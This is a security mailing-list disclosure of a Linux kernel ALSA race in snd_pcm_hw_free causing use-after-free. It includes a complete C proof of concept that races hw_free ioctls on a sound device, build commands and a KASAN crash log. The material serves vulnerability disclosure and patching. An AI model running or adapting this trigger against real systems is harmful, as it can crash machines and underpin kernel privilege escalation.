@@ -1,0 +1,1331 @@
+
+Date: Mon, 28 Mar 2022 22:06:40 +0800
+From: Hu Jiahui <kirin.say@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Linux Kernel: Race Condition in snd_pcm_hw_free leading to use-after-free
+
+This is the original report about CVE-2022-1048.
+
+Patch: https://lore.kernel.org/all/20220322170720.3529-1-tiwai@suse.de/#t
+
+
+---------- Forwarded message ---------
+发件人： Hu Jiahui <kirin.say@...il.com>
+Date: 2022年3月20日周日 22:22
+Subject: [vs] Linux Kernel: Race Condition in snd_pcm_hw_free leading to
+use-after-free
+To: <security@...nel>, <linux-distros>
+
+
+# Linux Kernel: Race Condition in snd_pcm_hw_free leading to use-after-free
+
+
+## Details
+
+
+In the path: snd_pcm_common_ioctl -> snd_pcm_hw_free:
+
+
+```c
+
+static int snd_pcm_hw_free(struct snd_pcm_substream *substream)
+
+{
+
+struct snd_pcm_runtime *runtime;
+
+int result;
+
+
+if (PCM_RUNTIME_CHECK(substream))
+
+return -ENXIO;
+
+runtime = substream->runtime;
+
+snd_pcm_stream_lock_irq(substream);
+
+switch (runtime->status->state) {
+
+case SNDRV_PCM_STATE_SETUP:
+
+case SNDRV_PCM_STATE_PREPARED:
+
+break;
+
+default:
+
+snd_pcm_stream_unlock_irq(substream);
+
+return -EBADFD;
+
+}
+
+snd_pcm_stream_unlock_irq(substream);
+
+if (atomic_read(&substream->mmap_count))
+
+return -EBADFD;
+
+result = do_hw_free(substream);
+
+snd_pcm_set_state(substream, SNDRV_PCM_STATE_OPEN);
+
+cpu_latency_qos_remove_request(&substream->latency_pm_qos_req);
+
+return result;
+
+}
+
+```
+
+It seems like that the function calls the unlock too early, this may lead
+to a race condition in the following code.
+
+And if two threads call do_hw_free->snd_pcm_lib_free_pages at the same time:
+
+```
+
+int snd_pcm_lib_free_pages(struct snd_pcm_substream *substream)
+
+{
+
+struct snd_card *card = substream->pcm->card;
+
+struct snd_pcm_runtime *runtime;
+
+
+if (PCM_RUNTIME_CHECK(substream))
+
+return -EINVAL;
+
+runtime = substream->runtime;
+
+if (runtime->dma_area == NULL)
+
+return 0;
+
+if (runtime->dma_buffer_p != &substream->dma_buffer) { // ******** 1
+********
+
+/* it's a newly allocated buffer. release it now. */
+
+do_free_pages(card, runtime->dma_buffer_p);
+
+kfree(runtime->dma_buffer_p); // ******** 2 ********
+
+}
+
+snd_pcm_set_runtime_buffer(substream, NULL);
+
+return 0;
+
+}
+
+```
+
+=> It will lead to a use-after-free(double free) issue in the kernel.
+
+
+## Suggestion
+
+
+Add a lock to the snd_pcm_hw_free and unlock it when return.
+
+
+## POC
+
+
+To trigger this vulnerability at (2), the poc should bypass the check in
+snd_pcm_lib_free_pages:(1). Actually, whether to apply for new memory here
+is related to the sound driver used in the system.
+
+If we add a virtual machine in VirtualBox with Ubuntu. The default sound
+driver is intel8x0, and in this driver we can alloc a new buffer and bypass
+the check in (1) easily.
+
+(But in the Vmware, the driver has requested the maximum memory size in
+advance. To trigger the vulnerability, we must write the
+"/proc/xxx/xxx/prealloc" file in sound card to force the driver to apply
+for a smaller buffer(in function snd_pcm_lib_preallocate_proc_write) so
+that we can alloc a new buffer in snd_pcm_lib_malloc_pages later.)
+
+
+**The POC:**
+
+
+```
+
+#include <stdio.h>
+
+#include <stdlib.h>
+
+#include "alsa/asoundlib.h"
+
+#include <stdbool.h>
+
+#include <sys/socket.h>
+
+#include <sys/msg.h>
+
+#include <sys/mman.h>
+
+#include <sys/wait.h>
+
+#include <unistd.h>
+
+#include <string.h>
+
+#include <stdlib.h>
+
+#include <arpa/inet.h>
+
+#include <sys/stat.h>
+
+#include <fcntl.h>
+
+#include <sched.h>
+
+#include <sys/ioctl.h>
+
+#include <sys/types.h>
+
+#include <stdio.h>
+
+#include <sys/ipc.h>
+
+#include <sys/msg.h>
+
+
+#include <sys/socket.h>
+
+#include <sys/syscall.h>
+
+#include <linux/if_packet.h>
+
+#include <linux/if_ether.h>
+
+#include <linux/if_arp.h>
+
+#include <sys/socket.h>
+
+#include <sys/syscall.h>
+
+#include <linux/if_packet.h>
+
+#include <linux/if_ether.h>
+
+#include <linux/if_arp.h>
+
+typedef unsigned int __u32;
+
+#define SNDRV_PCM_HW_PARAM_ACCESS 0 /* Access type */
+
+#define SNDRV_PCM_HW_PARAM_FORMAT 1 /* Format */
+
+#define SNDRV_PCM_HW_PARAM_SUBFORMAT 2 /* Subformat */
+
+#define SNDRV_PCM_HW_PARAM_FIRST_MASK SNDRV_PCM_HW_PARAM_ACCESS
+
+#define SNDRV_PCM_HW_PARAM_LAST_MASK SNDRV_PCM_HW_PARAM_SUBFORMAT
+
+
+#define SNDRV_PCM_HW_PARAM_SAMPLE_BITS 8 /* Bits per sample */
+
+#define SNDRV_PCM_HW_PARAM_FRAME_BITS 9 /* Bits per frame */
+
+#define SNDRV_PCM_HW_PARAM_CHANNELS 10 /* Channels */
+
+#define SNDRV_PCM_HW_PARAM_RATE 11 /* Approx rate */
+
+#define SNDRV_PCM_HW_PARAM_PERIOD_TIME 12 /* Approx distance between
+
+* interrupts in us
+
+*/
+
+#define SNDRV_PCM_HW_PARAM_PERIOD_SIZE 13 /* Approx frames between
+
+* interrupts
+
+*/
+
+#define SNDRV_PCM_HW_PARAM_PERIOD_BYTES 14 /* Approx bytes between
+
+* interrupts
+
+*/
+
+#define SNDRV_PCM_HW_PARAM_PERIODS 15 /* Approx interrupts per
+
+* buffer
+
+*/
+
+#define SNDRV_PCM_HW_PARAM_BUFFER_TIME 16 /* Approx duration of buffer
+
+* in us
+
+*/
+
+#define SNDRV_PCM_HW_PARAM_BUFFER_SIZE 17 /* Size of buffer in frames */
+
+#define SNDRV_PCM_HW_PARAM_BUFFER_BYTES 18 /* Size of buffer in bytes */
+
+#define SNDRV_PCM_HW_PARAM_TICK_TIME 19 /* Approx tick duration in us */
+
+#define SNDRV_PCM_HW_PARAM_FIRST_INTERVAL SNDRV_PCM_HW_PARAM_SAMPLE_BITS
+
+#define SNDRV_PCM_HW_PARAM_LAST_INTERVAL SNDRV_PCM_HW_PARAM_TICK_TIME
+
+
+struct snd_interval {
+
+unsigned int min, max;
+
+unsigned int openmin:1,
+
+openmax:1,
+
+integer:1,
+
+empty:1;
+
+};
+
+
+#define SNDRV_MASK_MAX 256
+
+
+struct snd_mask {
+
+__u32 bits[(SNDRV_MASK_MAX+31)/32];
+
+};
+
+
+typedef struct {
+
+int version;
+
+int fd;
+
+int card, device, subdevice;
+
+
+volatile struct snd_pcm_mmap_status * mmap_status;
+
+struct snd_pcm_mmap_control *mmap_control;
+
+bool mmap_status_fallbacked;
+
+bool mmap_control_fallbacked;
+
+struct snd_pcm_sync_ptr *sync_ptr;
+
+
+int period_event;
+
+snd_timer_t *period_timer;
+
+struct pollfd period_timer_pfd;
+
+int period_timer_need_poll;
+
+/* restricted parameters */
+
+snd_pcm_format_t format;
+
+int rate;
+
+int channels;
+
+/* for chmap */
+
+unsigned int chmap_caps;
+
+snd_pcm_chmap_query_t **chmap_override;
+
+} snd_pcm_hw_t;
+
+
+struct snd_pcm_hw_params {
+
+unsigned int flags;
+
+struct snd_mask masks[SNDRV_PCM_HW_PARAM_LAST_MASK -
+
+SNDRV_PCM_HW_PARAM_FIRST_MASK + 1];
+
+struct snd_mask mres[5]; /* reserved masks */
+
+struct snd_interval intervals[SNDRV_PCM_HW_PARAM_LAST_INTERVAL -
+
+SNDRV_PCM_HW_PARAM_FIRST_INTERVAL + 1];
+
+struct snd_interval ires[9]; /* reserved intervals */
+
+unsigned int rmask; /* W: requested masks */
+
+unsigned int cmask; /* R: changed masks */
+
+unsigned int info; /* R: Info flags for returned setup */
+
+unsigned int msbits; /* R: used most significant bits */
+
+unsigned int rate_num; /* R: rate numerator */
+
+unsigned int rate_den; /* R: rate denominator */
+
+snd_pcm_uframes_t fifo_size; /* R: chip FIFO size in frames */
+
+unsigned char reserved[64]; /* reserved for future */
+
+};
+
+int k;
+
+int magic_fd;
+
+unsigned char hw_params_data[] =
+
+{
+
+0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x04, 0x00,
+
+0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,
+
+0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
+
+0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x40, 0x1F, 0x00, 0x00,
+
+0x80, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0x35,
+
+0x05, 0x00, 0x00, 0x40, 0x1F, 0x00, 0x01, 0x00, 0x00, 0x00,
+
+0x00, 0x48, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x04, 0x00,
+
+0x00, 0x00, 0x00, 0x20, 0x01, 0x00, 0x00, 0x20, 0x01, 0x00,
+
+0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
+
+0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x55, 0x35, 0x05, 0x00,
+
+0x00, 0x40, 0x1F, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x48,
+
+0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+
+0x00, 0x20, 0x01, 0x00, 0x00, 0x20, 0x01, 0x00, 0x04, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xFF, 0x07, 0x00,
+
+0x03, 0x01, 0x0D, 0x80, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+
+};
+
+void race(){
+
+while(k!=1){};
+
+ioctl(magic_fd,0x4112,0);
+
+}
+
+int main(int argc, char *argv[])
+
+{
+
+int i;
+
+int j;
+
+int fd;
+
+snd_pcm_hw_params_t *ptr;
+
+snd_pcm_hw_params_malloc(&ptr);
+
+memcpy(ptr, hw_params_data, 0x260);
+
+magic_fd = open("/dev/snd/pcmC0D1c", 0);
+
+printf("[+] CHECK FD: %d\n",magic_fd);
+
+ioctl(magic_fd, 0xC2604111, ptr);
+
+#define RACE_NUM 20
+
+pthread_t race_thread[RACE_NUM]={};
+
+for(int i=0;i<RACE_NUM;i++){
+
+pthread_create(&race_thread[i],NULL,race,NULL);
+
+}
+
+k=1;
+
+for(int i=0;i<RACE_NUM;i++){
+
+pthread_join(race_thread[i],NULL);
+
+}
+
+return 0;
+
+}
+
+```
+
+
+To trigger it easily, please run it in VirtualBox with Ubuntu(with latest
+stable kernel version), and make sure that the user has permission to open
+"/dev/snd/pcmC0D1c"(in user group: audio) :
+
+```
+
+sudo apt-get install libasound2-dev
+
+gcc exp.c -lasound -lpthread -ldl -lm -o poc
+
+./poc # I lost a stable version of POC, you may need to run the poc(above)
+several times to see a kasan log of use-after-free.
+
+```
+
+
+## Reporter
+
+
+Kirin(@Pwnrin) of Tencent Security Xuanwu Lab
+
+
+## KASAN LOG
+
+```
+
+[ 141.594199] BUG: Bad page state in process exp pfn:79140
+
+[ 141.594201]
+==================================================================
+
+[ 141.594213] BUG: KASAN: use-after-free in snd_dma_free_pages+0x2cd/0x380
+[snd_pcm]
+
+[ 141.594217] Read of size 4 at addr ffff8880b34c9400 by task exp/1956
+
+
+[ 141.594224] CPU: 1 PID: 1956 Comm: exp Not tainted 5.4.166 #1
+
+[ 141.594226] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS
+VirtualBox 12/01/2006
+
+[ 141.594228] page:ffffea0001e45000 refcount:-1 mapcount:0
+mapping:0000000000000000 index:0x0 compound_mapcount: 0
+
+[ 141.594231] flags: 0xfffffc0010000(head)
+
+[ 141.594232] Call Trace:
+
+[ 141.594253] dump_stack+0x96/0xc7
+
+[ 141.594255] raw: 000fffffc0010000 dead000000000100 dead000000000122
+0000000000000000
+
+[ 141.594264] print_address_description.constprop.0+0x20/0x210
+
+[ 141.594265] raw: 0000000000000000 0000000000000000 ffffffffffffffff
+0000000000000000
+
+[ 141.594266] page dumped because: nonzero _refcount
+
+[ 141.594272] ? snd_dma_free_pages+0x2cd/0x380 [snd_pcm]
+
+[ 141.594275] __kasan_report.cold+0x37/0x77
+
+[ 141.594276] Modules linked in: nls_iso8859_1
+
+[ 141.594283] ? snd_dma_free_pages+0x2cd/0x380 [snd_pcm]
+
+[ 141.594284] intel_rapl_msr snd_intel8x0 snd_ac97_codec ac97_bus
+
+[ 141.594289] kasan_report+0x14/0x20
+
+[ 141.594289] snd_pcm snd_seq_midi
+
+[ 141.594293] __asan_report_load4_noabort+0x14/0x20
+
+[ 141.594294] snd_seq_midi_event snd_rawmidi
+
+[ 141.594300] snd_dma_free_pages+0x2cd/0x380 [snd_pcm]
+
+[ 141.594300] snd_seq intel_rapl_common crct10dif_pclmul
+
+[ 141.594308] snd_pcm_lib_free_pages+0xc6/0x250 [snd_pcm]
+
+[ 141.594308] ghash_clmulni_intel snd_seq_device joydev
+
+[ 141.594314] snd_intel8x0_hw_free+0x98/0x170 [snd_intel8x0]
+
+[ 141.594314] cryptd snd_timer rapl
+
+[ 141.594321] snd_pcm_common_ioctl+0x5d5/0x1b00 [snd_pcm]
+
+[ 141.594322] input_leds serio_raw snd vboxguest
+
+[ 141.594329] ? snd_pcm_status_user+0x130/0x130 [snd_pcm]
+
+[ 141.594330] soundcore mac_hid sch_fq_codel vmwgfx ttm
+
+[ 141.594338] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]
+
+[ 141.594339] drm_kms_helper fb_sys_fops syscopyarea
+
+[ 141.594344] do_vfs_ioctl+0x9da/0x1020
+
+[ 141.594345] sysfillrect sysimgblt drm
+
+[ 141.594349] ? ioctl_preallocate+0x1c0/0x1c0
+
+[ 141.594349] parport_pc ppdev
+
+[ 141.594353] ? __kasan_check_write+0x14/0x20
+
+[ 141.594353] lp parport ip_tables
+
+[ 141.594357] ? __fget+0x21c/0x3d0
+
+[ 141.594358] x_tables autofs4 hid_generic
+
+[ 141.594362] ? copy_fd_bitmaps+0x2e0/0x2e0
+
+[ 141.594363] usbhid hid psmouse
+
+[ 141.594366] ? __switch_to_asm+0x40/0x70
+
+[ 141.594367] crc32_pclmul ahci
+
+[ 141.594369] ? __switch_to_asm+0x34/0x70
+
+[ 141.594370] libahci e1000
+
+[ 141.594373] ? __switch_to_asm+0x40/0x70
+
+[ 141.594373] i2c_piix4 pata_acpi
+
+[ 141.594376] ? __switch_to_asm+0x34/0x70
+
+[ 141.594376] video
+
+[ 141.594381] ? __fget_light+0x17e/0x1f0
+
+[ 141.594384] ksys_ioctl+0x67/0x90
+
+[ 141.594387] __x64_sys_ioctl+0x73/0xb0
+
+[ 141.594391] ? fpregs_assert_state_consistent+0x22/0xa0
+
+[ 141.594395] do_syscall_64+0x9f/0x3c0
+
+[ 141.594398] ? syscall_return_slowpath+0x1a5/0x220
+
+[ 141.594402] entry_SYSCALL_64_after_hwframe+0x44/0xa9
+
+[ 141.594404] RIP: 0033:0x4e68b7
+
+[ 141.594409] Code: 4f 55 04 00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3
+90 48 89 e8 48 f7 d8 48 39 c3 0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05
+<48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
+
+[ 141.594410] RSP: 002b:00007fab6baaada8 EFLAGS: 00000246 ORIG_RAX:
+0000000000000010
+
+[ 141.594414] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
+00000000004e68b7
+
+[ 141.594415] RDX: 0000000000000000 RSI: 0000000000004112 RDI:
+0000000000000003
+
+[ 141.594417] RBP: 00007fab6baaadb0 R08: 00007fab6baab700 R09:
+00007fab6baab700
+
+[ 141.594419] R10: 00007fab6baab9d0 R11: 0000000000000246 R12:
+00007fab6baaae80
+
+[ 141.594421] R13: 0000000000000000 R14: 0000000000000000 R15:
+00007ffe52234d70
+
+
+[ 141.594427] CPU: 2 PID: 1948 Comm: exp Not tainted 5.4.166 #1
+
+[ 141.594429] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS
+VirtualBox 12/01/2006
+
+[ 141.594430] Call Trace:
+
+[ 141.594431] Allocated by task 1946:
+
+[ 141.594435] save_stack+0x23/0x90
+
+[ 141.594438] __kasan_kmalloc.constprop.0+0xcf/0xe0
+
+[ 141.594441] dump_stack+0x96/0xc7
+
+[ 141.594443] kasan_kmalloc+0x9/0x10
+
+[ 141.594445] bad_page.cold+0xfb/0x120
+
+[ 141.594448] kmem_cache_alloc_trace+0x113/0x290
+
+[ 141.594450] ? si_mem_available+0x310/0x310
+
+[ 141.594456] snd_pcm_lib_malloc_pages+0x2bd/0x680 [snd_pcm]
+
+[ 141.594458] ? __kasan_check_write+0x14/0x20
+
+[ 141.594461] snd_intel8x0_hw_params+0x10d/0x550 [snd_intel8x0]
+
+[ 141.594464] ? mutex_lock+0x8f/0xe0
+
+[ 141.594469] snd_pcm_hw_params+0x2c6/0x1250 [snd_pcm]
+
+[ 141.594471] free_pages_check_bad+0x147/0x1b0
+
+[ 141.594477] snd_pcm_common_ioctl+0x362/0x1b00 [snd_pcm]
+
+[ 141.594479] __free_pages_ok+0x80d/0xa60
+
+[ 141.594485] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]
+
+[ 141.594488] __free_pages+0x47/0x50
+
+[ 141.594491] do_vfs_ioctl+0x9da/0x1020
+
+[ 141.594505] dma_direct_free_pages+0xc7/0x150
+
+[ 141.594507] ksys_ioctl+0x67/0x90
+
+[ 141.594510] dma_direct_free+0xe/0x10
+
+[ 141.594512] __x64_sys_ioctl+0x73/0xb0
+
+[ 141.594514] dma_free_attrs+0x61/0x150
+
+[ 141.594517] do_syscall_64+0x9f/0x3c0
+
+[ 141.594524] ? snd_ac97_pcm_close+0x2d3/0x5a0 [snd_ac97_codec]
+
+[ 141.594527] entry_SYSCALL_64_after_hwframe+0x44/0xa9
+
+[ 141.594532] snd_dma_free_pages+0x16b/0x380 [snd_pcm]
+
+
+[ 141.594540] snd_pcm_lib_free_pages+0xc6/0x250 [snd_pcm]
+
+[ 141.594542] Freed by task 1947:
+
+[ 141.594545] snd_intel8x0_hw_free+0x11e/0x170 [snd_intel8x0]
+
+[ 141.594552] snd_pcm_common_ioctl+0x5d5/0x1b00 [snd_pcm]
+
+[ 141.594555] save_stack+0x23/0x90
+
+[ 141.594560] ? snd_pcm_status_user+0x130/0x130 [snd_pcm]
+
+[ 141.594563] __kasan_slab_free+0x137/0x180
+
+[ 141.594568] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]
+
+[ 141.594570] kasan_slab_free+0xe/0x10
+
+[ 141.594573] do_vfs_ioctl+0x9da/0x1020
+
+[ 141.594575] kfree+0x98/0x270
+
+[ 141.594577] ? ioctl_preallocate+0x1c0/0x1c0
+
+[ 141.594582] snd_pcm_lib_free_pages+0xed/0x250 [snd_pcm]
+
+[ 141.594585] ? __kasan_check_write+0x14/0x20
+
+[ 141.594588] snd_intel8x0_hw_free+0x11e/0x170 [snd_intel8x0]
+
+[ 141.594590] ? __fget+0x21c/0x3d0
+
+[ 141.594596] snd_pcm_common_ioctl+0x5d5/0x1b00 [snd_pcm]
+
+[ 141.594598] ? copy_fd_bitmaps+0x2e0/0x2e0
+
+[ 141.594603] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]
+
+[ 141.594605] ? __switch_to_asm+0x40/0x70
+
+[ 141.594607] ? __switch_to_asm+0x34/0x70
+
+[ 141.594609] do_vfs_ioctl+0x9da/0x1020
+
+[ 141.594611] ksys_ioctl+0x67/0x90
+
+[ 141.594613] ? __switch_to_asm+0x40/0x70
+
+[ 141.594614] __x64_sys_ioctl+0x73/0xb0
+
+[ 141.594617] do_syscall_64+0x9f/0x3c0
+
+[ 141.594619] ? __switch_to_asm+0x34/0x70
+
+[ 141.594621] entry_SYSCALL_64_after_hwframe+0x44/0xa9
+
+[ 141.594624] ? __fget_light+0x17e/0x1f0
+
+
+[ 141.594627] ksys_ioctl+0x67/0x90
+
+[ 141.594630] __x64_sys_ioctl+0x73/0xb0
+
+[ 141.594633] ? fpregs_assert_state_consistent+0x22/0xa0
+
+[ 141.594635] The buggy address belongs to the object at ffff8880b34c9400
+
+which belongs to the cache kmalloc-64 of size 64
+
+[ 141.594639] The buggy address is located 0 bytes inside of
+
+64-byte region [ffff8880b34c9400, ffff8880b34c9440)
+
+[ 141.594641] The buggy address belongs to the page:
+
+[ 141.594644] page:ffffea0002cd3240 refcount:1 mapcount:0
+mapping:ffff8880c5403600 index:0x0
+
+[ 141.594646] flags: 0xfffffc0000200(slab)
+
+[ 141.594649] do_syscall_64+0x9f/0x3c0
+
+[ 141.594652] ? syscall_return_slowpath+0x1a5/0x220
+
+[ 141.594653] raw: 000fffffc0000200 ffffea0001e253c0 0000000c0000000c
+ffff8880c5403600
+
+[ 141.594657] entry_SYSCALL_64_after_hwframe+0x44/0xa9
+
+[ 141.594658] raw: 0000000000000000 0000000080200020 00000001ffffffff
+0000000000000000
+
+[ 141.594659] page dumped because: kasan: bad access detected
+
+[ 141.594661] RIP: 0033:0x4e68b7
+
+
+[ 141.594664] Code: 4f 55 04 00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3
+90 48 89 e8 48 f7 d8 48 39 c3 0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05
+<48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
+
+[ 141.594666] RSP: 002b:00007fab6fab2da8 EFLAGS: 00000246 ORIG_RAX:
+0000000000000010
+
+[ 141.594668] Memory state around the buggy address:
+
+[ 141.594670] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
+00000000004e68b7
+
+[ 141.594672] RDX: 0000000000000000 RSI: 0000000000004112 RDI:
+0000000000000003
+
+[ 141.594674] RBP: 00007fab6fab2db0 R08: 00007fab6fab3700 R09:
+00007fab6fab3700
+
+[ 141.594675] ffff8880b34c9300: fb fb fb fb fb fb fb fb fc fc fc fc fc fc
+fc fc
+
+[ 141.594678] ffff8880b34c9380: fb fb fb fb fb fb fb fb fc fc fc fc fc fc
+fc fc
+
+[ 141.594680] >ffff8880b34c9400: fb fb fb fb fb fb fb fb fc fc fc fc fc fc
+fc fc
+
+[ 141.594682] ^
+
+[ 141.594684] ffff8880b34c9480: fb fb fb fb fb fb fb fb fc fc fc fc fc fc
+fc fc
+
+[ 141.594686] ffff8880b34c9500: 00 00 00 00 00 00 fc fc fc fc fc fc fc fc
+fc fc
+
+[ 141.594688]
+==================================================================
+
+[ 141.594690] Disabling lock debugging due to kernel taint
+
+[ 141.594692] R10: 00007fab6fab39d0 R11: 0000000000000246 R12:
+00007fab6fab2e80
+
+[ 141.594693] R13: 0000000000000000 R14: 0000000000000000 R15:
+00007ffe52234d70
+
+[ 141.594699] ------------[ cut here ]------------
+
+[ 141.594700] pm_qos_remove_request() called for unknown object
+
+[ 141.594706] snd-malloc: invalid device type 0
+
+[ 141.594709] ------------[ cut here ]------------
+
+[ 141.594710] pm_qos_remove_request() called for unknown object
+
+[ 141.594716] WARNING: CPU: 2 PID: 1948 at kernel/power/qos.c:477
+pm_qos_remove_request+0x204/0x2c0
+
+[ 141.594719] WARNING: CPU: 1 PID: 1956 at kernel/power/qos.c:477
+pm_qos_remove_request+0x204/0x2c0
+
+[ 141.594720] Modules linked in:
+
+[ 141.594721] Modules linked in:
+
+[ 141.594721] nls_iso8859_1 intel_rapl_msr
+
+[ 141.594723] nls_iso8859_1
+
+[ 141.594724] snd_intel8x0 snd_ac97_codec
+
+[ 141.594726] intel_rapl_msr
+
+[ 141.594727] ac97_bus snd_pcm
+
+[ 141.594728] snd_intel8x0
+
+[ 141.594729] snd_seq_midi
+
+[ 141.594730] snd_ac97_codec
+
+[ 141.594731] snd_seq_midi_event
+
+[ 141.594732] ac97_bus
+
+[ 141.594733] snd_rawmidi snd_seq
+
+[ 141.594735] snd_pcm
+
+[ 141.594736] intel_rapl_common
+
+[ 141.594737] snd_seq_midi
+
+[ 141.594738] crct10dif_pclmul ghash_clmulni_intel
+
+[ 141.594740] snd_seq_midi_event
+
+[ 141.594740] snd_seq_device joydev
+
+[ 141.594742] snd_rawmidi
+
+[ 141.594743] cryptd
+
+[ 141.594744] snd_seq
+
+[ 141.594745] snd_timer rapl
+
+[ 141.594747] intel_rapl_common
+
+[ 141.594748] input_leds serio_raw
+
+[ 141.594749] crct10dif_pclmul
+
+[ 141.594750] snd vboxguest
+
+[ 141.594752] ghash_clmulni_intel
+
+[ 141.594753] soundcore
+
+[ 141.594754] snd_seq_device
+
+[ 141.594755] mac_hid sch_fq_codel
+
+[ 141.594756] joydev
+
+[ 141.594757] vmwgfx
+
+[ 141.594758] cryptd
+
+[ 141.594759] ttm drm_kms_helper
+
+[ 141.594761] snd_timer
+
